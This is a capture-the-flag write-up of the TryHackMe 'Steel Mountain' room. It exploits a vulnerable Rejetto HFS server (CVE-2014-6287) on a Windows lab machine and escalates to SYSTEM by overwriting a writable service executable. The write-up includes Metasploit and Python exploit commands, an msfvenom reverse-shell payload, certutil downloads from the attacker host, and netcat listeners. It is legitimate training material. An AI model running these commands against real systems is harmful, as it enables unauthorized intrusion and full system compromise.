# Resolution Report: Room “Steel Mountain” (TryHackMe)

**Author:** stylishack
**Date:** 14th January 2026
**Target IP:** 10.67.136.254 (Static)
**Attacker IP:** Dynamic (Multiple IPs used: 10.67.120.217, 10.67.113.162, 10.67.104.185)

---

## Introduction

This report details the methodology followed to solve the TryHackMe room “Steel Mountain”. The objective was to enumerate a Windows machine, gain initial access by exploiting a vulnerable HTTP File Server (HFS), and escalate privileges to Administrator (SYSTEM) using misconfigured Windows Services. Two methods were used: an automated approach using Metasploit and a manual approach using Python exploits.

---

## Phase 1: Reconnaissance and Enumeration

The process began with a network scan to identify services.

### Actions:
A Stealth SYN scan was performed. Initially, a very aggressive rate was used, which missed some ports. A more balanced scan was later performed.

```bash
nmap -p- -sS -n -Pn --min-rate 5000 10.67.136.254
# Focused Service Scan (Correction for previously missed ports)
nmap -p 80,8080 -sV 10.67.136.254
```

### Key Findings:
**Open Ports:**
*   **80/tcp (HTTP):** Microsoft IIS 8.5.
    *   *Finding:* The website displayed an "Employee of the Month". By inspecting the image source code, the employee was identified as **Bill Harper**.
*   **8080/tcp (HTTP):** **Rejetto HTTP File Server (HFS) 2.3**.
    *   *Significance:* This specific version is known to be vulnerable to Remote Command Execution (RCE).
*   **49152-49188/tcp (Unknown/MSRPC):**
    *   *Explanation:* These are **RPC Ephemeral Ports**. In Windows environments, the RPC Endpoint Mapper (Port 135) directs client requests to these high-numbered, dynamic ports where specific services are listening. These are standard behavior for Windows machines and indicate the presence of various Windows services.

---

## Phase 2: Vulnerability Research & Analysis (NIST/CISA)

Before proceeding with exploitation, a vulnerability analysis was conducted based on the service identified: HFS 2.3. A search was performed on the NIST and CISA databases to identify potential exploits.

### Findings:
Three main CVEs were identified for "HFS 2.3":
*   **CVE-2024-23692:** Template injection. (Discarded: Too recent for the machine's creation date and the context of the CTF).
*   **CVE-2021-21300:** Git vulnerability. (Discarded: Software mismatch; the target is HFS, not Git).
*   **CVE-2014-6287:** Rejetto HTTP File Server ... allows remote attackers to execute arbitrary programs via a `%00` sequence in a search action.

### Conclusion:
**CVE-2014-6287** was selected as the correct vector because it matches the software version, the timeframe of the room's creation, and describes a Remote Command Execution (RCE) capability, which fits the objective of gaining initial access.

---

## Phase 3: Initial Access (Metasploit)

We utilized Metasploit to exploit CVE-2014-6287 automatically.

### Actions:
Launched Metasploit Console and selected the exploit module for Rejetto HFS.

```bash
msfconsole -q
search CVE-2014-6287
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.67.136.254
set RPORT 8080  # Crucial: The service was not on default port 80
set LHOST 10.67.120.217
run
```

### Outcome:
A Meterpreter session was established as user `bill`.
*   **User Flag:** Located at `C:\Users\bill\Desktop\user.txt`.
*   **Flag Content:** 
---

## Phase 4: Privilege Escalation (PowerUp & Service Exploitation)

To escalate privileges, we used the `PowerUp.ps1` script to identify system misconfigurations.

### 4.1 Enumeration

`PowerUp.ps1` was uploaded to the victim machine via Meterpreter and executed via the PowerShell extension to bypass execution policies.

```bash
# Commands Used (Attacker Machine)
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

# Commands Used (Meterpreter Session)
meterpreter > upload PowerUp.ps1
[*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): PowerUp.ps1 -> PowerUp.ps1
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks
```

**Output (Snippet from `Invoke-AllChecks`):**
```
...
ServiceName     : AdvancedSystemCareService9
Path            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath  : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName       : LocalSystem
AbuseFunction   : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart      : True
Name            : AdvancedSystemCareService9
Check           : Unquoted Service Paths
...
```

### 4.2 Identified Vulnerability: Unquoted Service Path with Modifiable File Permissions

PowerUp identified `AdvancedSystemCareService9` (an IObit Advanced SystemCare service) as vulnerable due to an **Unquoted Service Path** and **Modifiable Service Files** (permissions allowing the `bill` user to write to the service executable's directory). Crucially, the `CanRestart` property was `True`, meaning the service could be stopped and started by the current user.

**Explanation of Unquoted Service Path:**
When a Windows service's executable path contains spaces and is not enclosed in quotation marks (e.g., `C:\Program Files\Service Name\service.exe` instead of `"C:\Program Files\Service Name\service.exe"`), the system may misinterpret the path. It will attempt to execute `C:\Program.exe`, then `C:\Program Files\Service.exe`, and so on, until it finds a valid executable. If an attacker can place a malicious executable named `Program.exe` (or `Service.exe` in `C:\Program Files\`) in an earlier part of this path, the system will execute it instead of the legitimate service. In this case, the vulnerability was further compounded by weak file permissions, allowing the `ASCService.exe` itself to be replaced directly.

### 4.3 Payload Generation

A reverse shell executable was generated using `msfvenom` to connect back to the attacker as `NT AUTHORITY\SYSTEM`.

```bash
# Command Used (Attacker Machine)
msfvenom -p windows/shell_reverse_tcp LHOST=10.67.120.217 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```

### 4.4 Exploitation Attempt 1: Meterpreter `upload` (Failed)

A `netcat` listener was set up (`nc -lvnp 4443`). The Meterpreter `upload` command was attempted to replace the service executable directly.

**Error Encountered:**
Due to network instability or VPN lag, the Meterpreter channel became unresponsive during the file transfer, resulting in a timeout and loss of the session.

```bash
meterpreter > upload /root/Advanced.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
[-] Send timed out. Timeout currently 15 seconds...
[*] Meterpreter session 1 closed. Reason: Died
```

### 4.5 Exploitation Attempt 2: Hybrid Method (Metasploit Shell + `Certutil`)

To overcome the connection instability experienced with Meterpreter's native `upload` command, a hybrid strategy was employed. The Metasploit exploit was re-run to regain user access, but the file transfer was handled using native Windows utilities invoked from within the Meterpreter-spawned shell.

**Recovery Actions:**
1.  **Session Restoration:** The initial Metasploit exploit was re-run (`run` command in `msfconsole`) to regain the Meterpreter session with user `bill`.
2.  **Web Server Setup:** A Python HTTP server was started on the attacker machine to host the malicious `Advanced.exe`. Port **8090** was used as port 80 was occupied.
    ```bash
    python3 -m http.server 8090
    ```

**File Transfer with `Certutil` (The Solution):**
Instead of using the unstable `upload` command, the Meterpreter session was used to spawn a system shell (`shell` command). Inside this native Windows `cmd` shell, `certutil.exe` was used to download the payload via HTTP, bypassing the Meterpreter data tunnel issues.

**Commands Executed on Victim (Windows Shell inside Meterpreter):**
First, the service was stopped to release the file lock on the executable.
```cmd
sc stop AdvancedSystemCareService9
# Output: [SC] ControlService FAILED 1062: The service has not been started.
# (This indicates the service was already stopped or corrupted from a previous failed attempt, which is acceptable).
```

Then, the payload was downloaded, overwriting the legitimate binary:
```cmd
certutil -urlcache -split -f http://10.67.120.217:8090/Advanced.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
# Output: **** Online **** ... CertUtil: -URLCache command completed successfully.
# (The Python web server also showed a GET /Advanced.exe 200 OK entry).
```

**Execution (Trigger):**
With the listener active (`nc -lvnp 4443`), the service was restarted, triggering the execution of the malicious binary as SYSTEM.
```cmd
sc start AdvancedSystemCareService9
```

---

## Phase 5: Obtaining the Root Flag

The Netcat listener received the connection immediately after the service start.

**Output (Netcat Listener):**
```
Listening on 0.0.0.0 4443
Connection received on 10.67.136.254 49336
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

With `NT AUTHORITY\SYSTEM` privileges, the final flag was located on the Administrator's desktop.

```cmd
cd C:\Users\Administrator\Desktop
dir
type root.txt
```

**Root Flag:** 

---

## Phase 6: Manual Exploitation (Without Metasploit)

To further solidify understanding, the entire process was repeated manually, avoiding the Metasploit Framework.

### 6.1 Preparation: Gathering Tools

Before attempting the manual exploitation, two specific files were required on the attacker machine to facilitate the attack:

### The Exploit Code (39161.py)

- **Purpose:** This is the Python script that triggers the vulnerability (CVE-2014-6287) in HFS. It sends a specially crafted HTTP request to the victim, forcing it to download and execute a file from our attacker machine.
- **Obtaining the file:** The script was located using `searchsploit`, a local database of exploits.

```bash
searchsploit -m 39161
````

### The Netcat Binary (nc.exe)

* **Purpose:** Windows does not have a native "reverse shell" tool like Netcat installed by default. We needed to provide `nc.exe` for the victim machine to establish a reverse shell connection back to our listener. The exploit script would instruct the victim to download and execute this binary.
* **Obtaining the file:** `nc.exe` was downloaded directly from a GitHub repository.

```bash
wget https://github.com/int0x33/nc.exe/raw/master/nc.exe
```

> **Note:** Initial attempts to locate it within Kali’s `/usr/share/windows-resources/binaries/` proved unsuccessful, so direct download was the chosen method.

```
```


### 6.2 Re-establishing Initial Access Manually

**Attacker IP (New Session Example):** 10.67.104.185

1.  **Required Tools:**
    *   **Exploit Code:** `39161.py` (Modified to point to the current attacker IP `10.67.104.185` and listener port `4443`).
    *   **Netcat Binary:** `nc.exe` (for Windows).
    These files were hosted on a Python HTTP server on the attacker's machine.

2.  **Setup Listeners and Web Server:**
    *   **Terminal 1 (Web Server):** `python3 -m http.server 8090` (Hosting `nc.exe` and `Advanced.exe`).
    *   **Terminal 2 (Listener):** `nc -lvnp 4443` (Waiting for the initial user shell).

3.  **Launch Python Exploit (Run Twice):**
    The Python exploit was executed twice using `python2` (due to script's syntax written for Python 2) against the target machine's HFS service on port 8080.
    ```bash
    python2 39161.py 10.67.136.254 8080
    ```
    *   The first execution downloaded `nc.exe` to the victim.
    *   The second execution launched `nc.exe`, establishing a reverse shell to `nc -lvnp 4443`.

### 6.3 Manual Service Enumeration Question

The room asked for the PowerShell command to manually find the service name.

**Question:** `What powershell -c command could we run to manually find out the service name? __________ __ _____________`

**Answer:** `powershell -c "Get-Service"`

### 6.4 Manual Privilege Escalation

After re-establishing the user shell, the privilege escalation was performed manually.

1.  **Payload Generation:** A new `msfvenom` payload (`Advanced.exe`) was generated with the current attacker IP (`10.67.104.185`) and listener port `4444`.
    ```bash
    msfvenom -p windows/shell_reverse_tcp LHOST=10.67.104.185 LPORT=4444 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
    ```

2.  **Setup SYSTEM Listener:** A new `netcat` listener was prepared (`nc -lvnp 4444`).

3.  **Execute on Victim (Shell as `bill`):**
    The service was stopped, the malicious `Advanced.exe` was downloaded using `certutil` from the Python web server on port 8090, and the service was restarted.

    **Commands Used (Victim Shell):**
    ```cmd
    sc stop AdvancedSystemCareService9
    powershell -c "Invoke-WebRequest -Uri 'http://10.67.104.185:8090/Advanced.exe' -OutFile 'C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe'"
    # Note: Initial attempt with Invoke-WebRequest hung, requiring a switch to certutil.
    # The certutil command was:
    # certutil -urlcache -split -f http://10.67.104.185:8090/Advanced.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
    sc start AdvancedSystemCareService9
    ```

A shell was successfully obtained with `NT AUTHORITY\SYSTEM` privileges on the `nc -lvnp 4444` listener.

---

## 7. Conclusion

The "Steel Mountain" room provided a comprehensive learning experience in Windows penetration testing, covering both automated and manual approaches. The engagement highlighted several critical cybersecurity concepts:

*   **Effective Enumeration:** Importance of robust Nmap scanning and service versioning.
*   **Vulnerability Research:** Identifying and leveraging publicly known CVEs for initial access.
*   **Metasploit Proficiency:** Utilizing the Metasploit Framework for rapid exploitation.
*   **Privilege Escalation Techniques:** Discovery and exploitation of misconfigurations (Unquoted Service Paths with weak permissions) using `PowerUp`.
*   **Manual Exploitation:** Reinforcing understanding by replicating attacks without automated tools, involving custom Python exploits, `Netcat`, and robust file transfer techniques (`certutil`).
*   **Adapting to Challenges:** Overcoming network instabilities and tool limitations by choosing appropriate methods and debugging issues effectively (e.g., Python version, port conflicts, `Ctrl+C` behavior in basic shells).

This room successfully simulated a real-world scenario where a vulnerable web application provided initial entry, leading to an extensive privilege escalation path on a Windows server.
